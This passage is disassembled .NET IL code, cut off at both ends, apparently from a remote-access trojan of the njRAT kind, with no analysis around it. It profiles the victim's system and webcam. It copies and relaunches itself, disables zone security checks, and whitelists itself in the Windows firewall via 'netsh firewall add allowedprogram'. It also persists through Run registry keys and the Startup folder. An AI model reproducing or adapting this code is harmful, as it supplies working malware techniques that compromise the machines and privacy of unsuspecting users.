      IL_02bc:  conv.ovf.i4
      IL_02bd:  ldc.i4.1
      IL_02be:  ceq
      IL_02c0:  stloc.s    V_28
      IL_02c2:  ldloc.s    V_28
      IL_02c4:  brfalse.s  IL_02d2

      IL_02c6:  ldloc.1
      IL_02c7:  ldstr      "0"
      IL_02cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02d1:  stloc.1
      IL_02d2:  nop
      IL_02d3:  ldloc.1
      IL_02d4:  ldloc.s    V_13
      IL_02d6:  ldloc.s    V_13
      IL_02d8:  ldlen
      IL_02d9:  conv.ovf.i4
      IL_02da:  ldc.i4.1
      IL_02db:  sub.ovf
      IL_02dc:  ldelem.ref
      IL_02dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02e2:  stloc.1
      IL_02e3:  leave.s    IL_0313

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e5:  dup
      IL_02e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02eb:  stloc.s    V_14
      IL_02ed:  nop
      IL_02ee:  ldloc.s    V_14
      IL_02f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f5:  nop
      IL_02f6:  ldloc.s    V_14
      IL_02f8:  stloc.s    V_15
      IL_02fa:  ldloc.1
      IL_02fb:  ldstr      "0"
      IL_0300:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0305:  stloc.1
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_030b:  nop
      IL_030c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0311:  leave.s    IL_0313

    }  // end handler
    IL_0313:  nop
    IL_0314:  nop
    .try
    {
      IL_0315:  ldc.i4.s   38
      IL_0317:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_031c:  ldstr      "x86"
      IL_0321:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0326:  stloc.s    V_28
      IL_0328:  ldloc.s    V_28
      IL_032a:  brfalse.s  IL_033f

      IL_032c:  ldloc.1
      IL_032d:  ldstr      " x64"
      IL_0332:  ldsfld     string j.OK::Y
      IL_0337:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_033c:  stloc.1
      IL_033d:  br.s       IL_0351

      IL_033f:  nop
      IL_0340:  ldloc.1
      IL_0341:  ldstr      " x86"
      IL_0346:  ldsfld     string j.OK::Y
      IL_034b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0350:  stloc.1
      IL_0351:  nop
      IL_0352:  leave.s    IL_0382

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0354:  dup
      IL_0355:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_035a:  stloc.s    V_16
      IL_035c:  nop
      IL_035d:  ldloc.s    V_16
      IL_035f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0364:  nop
      IL_0365:  ldloc.s    V_16
      IL_0367:  stloc.s    V_17
      IL_0369:  ldloc.1
      IL_036a:  ldsfld     string j.OK::Y
      IL_036f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0374:  stloc.1
      IL_0375:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_037a:  nop
      IL_037b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0380:  leave.s    IL_0382

    }  // end handler
    IL_0382:  nop
    IL_0383:  call       bool j.OK::Cam()
    IL_0388:  stloc.s    V_28
    IL_038a:  ldloc.s    V_28
    IL_038c:  brfalse.s  IL_03a1

    IL_038e:  ldloc.1
    IL_038f:  ldstr      "Yes"
    IL_0394:  ldsfld     string j.OK::Y
    IL_0399:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_039e:  stloc.1
    IL_039f:  br.s       IL_03b3

    IL_03a1:  nop
    IL_03a2:  ldloc.1
    IL_03a3:  ldstr      "No"
    IL_03a8:  ldsfld     string j.OK::Y
    IL_03ad:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_03b2:  stloc.1
    IL_03b3:  nop
    IL_03b4:  ldc.i4.7
    IL_03b5:  newarr     [mscorlib]System.String
    IL_03ba:  stloc.s    V_25
    IL_03bc:  ldloc.s    V_25
    IL_03be:  ldc.i4.0
    IL_03bf:  ldloc.1
    IL_03c0:  stelem.ref
    IL_03c1:  nop
    IL_03c2:  ldloc.s    V_25
    IL_03c4:  ldc.i4.1
    IL_03c5:  ldsfld     string j.OK::VR
    IL_03ca:  stelem.ref
    IL_03cb:  nop
    IL_03cc:  ldloc.s    V_25
    IL_03ce:  ldc.i4.2
    IL_03cf:  ldsfld     string j.OK::Y
    IL_03d4:  stelem.ref
    IL_03d5:  nop
    IL_03d6:  ldloc.s    V_25
    IL_03d8:  ldc.i4.3
    IL_03d9:  ldstr      ".."
    IL_03de:  stelem.ref
    IL_03df:  nop
    IL_03e0:  ldloc.s    V_25
    IL_03e2:  ldc.i4.4
    IL_03e3:  ldsfld     string j.OK::Y
    IL_03e8:  stelem.ref
    IL_03e9:  nop
    IL_03ea:  ldloc.s    V_25
    IL_03ec:  ldc.i4.5
    IL_03ed:  call       string j.OK::ACT()
    IL_03f2:  stelem.ref
    IL_03f3:  nop
    IL_03f4:  ldloc.s    V_25
    IL_03f6:  ldc.i4.6
    IL_03f7:  ldsfld     string j.OK::Y
    IL_03fc:  stelem.ref
    IL_03fd:  nop
    IL_03fe:  ldloc.s    V_25
    IL_0400:  call       string [mscorlib]System.String::Concat(string[])
    IL_0405:  stloc.1
    IL_0406:  ldstr      ""
    IL_040b:  stloc.2
    IL_040c:  nop
    .try
    {
      IL_040d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0412:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0417:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_041c:  ldstr      "Software\\"
      IL_0421:  ldsfld     string j.OK::RG
      IL_0426:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_042b:  ldc.i4.0
      IL_042c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_0431:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0436:  stloc.s    V_27
      IL_0438:  ldc.i4.0
      IL_0439:  stloc.s    V_26
      IL_043b:  br.s       IL_046b

      IL_043d:  ldloc.s    V_27
      IL_043f:  ldloc.s    V_26
      IL_0441:  ldelem.ref
      IL_0442:  stloc.s    V_18
      IL_0444:  ldloc.s    V_18
      IL_0446:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_044b:  ldc.i4.s   32
      IL_044d:  ceq
      IL_044f:  stloc.s    V_28
      IL_0451:  ldloc.s    V_28
      IL_0453:  brfalse.s  IL_0463

      IL_0455:  ldloc.2
      IL_0456:  ldloc.s    V_18
      IL_0458:  ldstr      ","
      IL_045d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0462:  stloc.2
      IL_0463:  nop
      IL_0464:  ldloc.s    V_26
      IL_0466:  ldc.i4.1
      IL_0467:  add.ovf
      IL_0468:  stloc.s    V_26
      IL_046a:  nop
      IL_046b:  ldloc.s    V_26
      IL_046d:  ldloc.s    V_27
      IL_046f:  ldlen
      IL_0470:  conv.ovf.i4
      IL_0471:  clt
      IL_0473:  stloc.s    V_28
      IL_0475:  ldloc.s    V_28
      IL_0477:  brtrue.s   IL_043d

      IL_0479:  leave.s    IL_049d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_047b:  dup
      IL_047c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0481:  stloc.s    V_19
      IL_0483:  nop
      IL_0484:  ldloc.s    V_19
      IL_0486:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_048b:  nop
      IL_048c:  ldloc.s    V_19
      IL_048e:  stloc.s    V_20
      IL_0490:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0495:  nop
      IL_0496:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_049b:  leave.s    IL_049d

    }  // end handler
    IL_049d:  nop
    IL_049e:  ldloc.1
    IL_049f:  ldloc.2
    IL_04a0:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04a5:  stloc.0
    IL_04a6:  br.s       IL_04a8

    IL_04a8:  ldloc.0
    IL_04a9:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       853 (0x355)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             string[] V_14,
             bool V_15,
             bool V_16)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x3e8
    IL_0006:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000b:  nop
    IL_000c:  ldsfld     bool j.OK::Idr
    IL_0011:  brfalse.s  IL_0047

    IL_0013:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0018:  ldsfld     string j.OK::DR
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0027:  ldstr      "\\"
    IL_002c:  ldsfld     string j.OK::EXE
    IL_0031:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0040:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0045:  brfalse.s  IL_004a

    IL_0047:  ldc.i4.0
    IL_0048:  br.s       IL_004b

    IL_004a:  ldc.i4.1
    IL_004b:  nop
    IL_004c:  stloc.s    V_15
    IL_004e:  ldloc.s    V_15
    IL_0050:  brfalse    IL_0144

    IL_0055:  nop
    .try
    {
      IL_0056:  ldsfld     string j.OK::DR
      IL_005b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0060:  ldstr      "\\"
      IL_0065:  ldsfld     string j.OK::EXE
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006f:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0074:  stloc.s    V_16
      IL_0076:  ldloc.s    V_16
      IL_0078:  brfalse.s  IL_0099

      IL_007a:  ldsfld     string j.OK::DR
      IL_007f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0084:  ldstr      "\\"
      IL_0089:  ldsfld     string j.OK::EXE
      IL_008e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0093:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0098:  nop
      IL_0099:  nop
      IL_009a:  ldsfld     string j.OK::DR
      IL_009f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00a4:  ldstr      "\\"
      IL_00a9:  ldsfld     string j.OK::EXE
      IL_00ae:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b3:  ldc.i4.1
      IL_00b4:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00b9:  stloc.1
      IL_00ba:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00bf:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00c4:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00c9:  stloc.0
      IL_00ca:  ldloc.1
      IL_00cb:  ldloc.0
      IL_00cc:  ldc.i4.0
      IL_00cd:  ldloc.0
      IL_00ce:  ldlen
      IL_00cf:  conv.ovf.i4
      IL_00d0:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00d5:  nop
      IL_00d6:  ldloc.1
      IL_00d7:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00dc:  nop
      IL_00dd:  ldloc.1
      IL_00de:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00e3:  nop
      IL_00e4:  ldsfld     string j.OK::DR
      IL_00e9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00ee:  ldstr      "\\"
      IL_00f3:  ldsfld     string j.OK::EXE
      IL_00f8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fd:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_0102:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0107:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_010c:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0111:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0116:  pop
      IL_0117:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_011c:  nop
      IL_011d:  leave.s    IL_0143

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_011f:  dup
      IL_0120:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0125:  stloc.3
      IL_0126:  nop
      IL_0127:  ldloc.3
      IL_0128:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012d:  nop
      IL_012e:  ldloc.3
      IL_012f:  stloc.2
      IL_0130:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0135:  nop
      IL_0136:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013b:  nop
      IL_013c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0141:  leave.s    IL_0143

    }  // end handler
    IL_0143:  nop
    IL_0144:  nop
    IL_0145:  nop
    .try
    {
      IL_0146:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_014b:  ldstr      "1"
      IL_0150:  ldc.i4.1
      IL_0151:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0156:  nop
      IL_0157:  leave.s    IL_017b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0159:  dup
      IL_015a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015f:  stloc.s    V_5
      IL_0161:  nop
      IL_0162:  ldloc.s    V_5
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0169:  nop
      IL_016a:  ldloc.s    V_5
      IL_016c:  stloc.s    V_4
      IL_016e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0173:  nop
      IL_0174:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0179:  leave.s    IL_017b

    }  // end handler
    IL_017b:  nop
    IL_017c:  nop
    .try
    {
      IL_017d:  ldc.i4.5
      IL_017e:  newarr     [mscorlib]System.String
      IL_0183:  stloc.s    V_14
      IL_0185:  ldloc.s    V_14
      IL_0187:  ldc.i4.0
      IL_0188:  ldstr      "netsh firewall add allowedprogram \""
      IL_018d:  stelem.ref
      IL_018e:  nop
      IL_018f:  ldloc.s    V_14
      IL_0191:  ldc.i4.1
      IL_0192:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0197:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_019c:  stelem.ref
      IL_019d:  nop
      IL_019e:  ldloc.s    V_14
      IL_01a0:  ldc.i4.2
      IL_01a1:  ldstr      "\" \""
      IL_01a6:  stelem.ref
      IL_01a7:  nop
      IL_01a8:  ldloc.s    V_14
      IL_01aa:  ldc.i4.3
      IL_01ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01b0:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_01b5:  stelem.ref
      IL_01b6:  nop
      IL_01b7:  ldloc.s    V_14
      IL_01b9:  ldc.i4.4
      IL_01ba:  ldstr      "\" ENABLE"
      IL_01bf:  stelem.ref
      IL_01c0:  nop
      IL_01c1:  ldloc.s    V_14
      IL_01c3:  call       string [mscorlib]System.String::Concat(string[])
      IL_01c8:  ldc.i4.0
      IL_01c9:  ldc.i4.1
      IL_01ca:  ldc.i4     0x1388
      IL_01cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01d4:  pop
      IL_01d5:  leave.s    IL_01f9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01d7:  dup
      IL_01d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01dd:  stloc.s    V_7
      IL_01df:  nop
      IL_01e0:  ldloc.s    V_7
      IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e7:  nop
      IL_01e8:  ldloc.s    V_7
      IL_01ea:  stloc.s    V_6
      IL_01ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f1:  nop
      IL_01f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f7:  leave.s    IL_01f9

    }  // end handler
    IL_01f9:  nop
    IL_01fa:  ldsfld     bool j.OK::Isu
    IL_01ff:  stloc.s    V_16
    IL_0201:  ldloc.s    V_16
    IL_0203:  brfalse    IL_02d0

    IL_0208:  nop
    .try
    {
      IL_0209:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_020e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0213:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0218:  ldsfld     string j.OK::sf
      IL_021d:  ldc.i4.1
      IL_021e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0223:  ldsfld     string j.OK::RG
      IL_0228:  ldstr      "\""
      IL_022d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0232:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0237:  ldstr      "\" .."
      IL_023c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0241:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0246:  nop
      IL_0247:  leave.s    IL_026b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0249:  dup
      IL_024a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024f:  stloc.s    V_9
      IL_0251:  nop
      IL_0252:  ldloc.s    V_9
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0259:  nop
      IL_025a:  ldloc.s    V_9
      IL_025c:  stloc.s    V_8
      IL_025e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0263:  nop
      IL_0264:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0269:  leave.s    IL_026b

    }  // end handler
    IL_026b:  nop
    IL_026c:  nop
    .try
    {
      IL_026d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0272:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0277:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_027c:  ldsfld     string j.OK::sf
      IL_0281:  ldc.i4.1
      IL_0282:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0287:  ldsfld     string j.OK::RG
      IL_028c:  ldstr      "\""
      IL_0291:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0296:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029b:  ldstr      "\" .."
      IL_02a0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02a5:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_02aa:  nop
      IL_02ab:  leave.s    IL_02cf

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02ad:  dup
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  stloc.s    V_10
      IL_02b5:  nop
      IL_02b6:  ldloc.s    V_10
      IL_02b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02bd:  nop
      IL_02be:  ldloc.s    V_10
      IL_02c0:  stloc.s    V_11
      IL_02c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c7:  nop
      IL_02c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02cd:  leave.s    IL_02cf

    }  // end handler
    IL_02cf:  nop
    IL_02d0:  nop
    IL_02d1:  ldsfld     bool j.OK::IsF
    IL_02d6:  stloc.s    V_16
    IL_02d8:  ldloc.s    V_16
    IL_02da:  brfalse.s  IL_0352

    IL_02dc:  nop
    .try
    {
      IL_02dd:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_02e2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02e7:  ldc.i4.7
      IL_02e8:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02ed:  ldstr      "\\"
      IL_02f2:  ldsfld     string j.OK::RG
      IL_02f7:  ldstr      ".exe"
      IL_02fc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0301:  ldc.i4.1
      IL_0302:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0307:  nop
      IL_0308:  ldc.i4.7
      IL_0309:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_030e:  ldstr      "\\"
      IL_0313:  ldsfld     string j.OK::RG
      IL_0318:  ldstr      ".exe"
      IL_031d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0322:  ldc.i4.3
      IL_0323:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_0328:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_032d:  leave.s    IL_0351

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_032f:  dup
      IL_0330:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0335:  stloc.s    V_12
      IL_0337:  nop
      IL_0338:  ldloc.s    V_12
      IL_033a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_033f:  nop
      IL_0340:  ldloc.s    V_12
      IL_0342:  stloc.s    V_13
      IL_0344:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0349:  nop
      IL_034a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_034f:  leave.s    IL_0351

    }  // end handler
    IL_0351:  nop
    IL_0352:  nop
    IL_0353:  nop
    IL_0354:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       1012 (0x3f4)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             class [mscorlib]System.Threading.Thread V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             native int V_20,
             bool V_21,
             bool V_22)
    IL_0000:  nop
    IL_0001:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0006:  ldnull
    IL_0007:  ceq
    IL_0009:  ldc.i4.0
    IL_000a:  ceq
    IL_000c:  stloc.s    V_21
    IL_000e:  ldloc.s    V_21
    IL_0010:  brfalse.s  IL_0062

    IL_0012:  nop
    .try
    {
      IL_0013:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0018:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_001d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0022:  ldstr      "di"
      IL_0027:  ldstr      "!"
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0031:  nop
      IL_0032:  leave.s    IL_0056

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0034:  dup
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  stloc.s    V_5
      IL_003c:  nop
      IL_003d:  ldloc.s    V_5
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  nop
      IL_0045:  ldloc.s    V_5
      IL_0047:  stloc.s    V_4
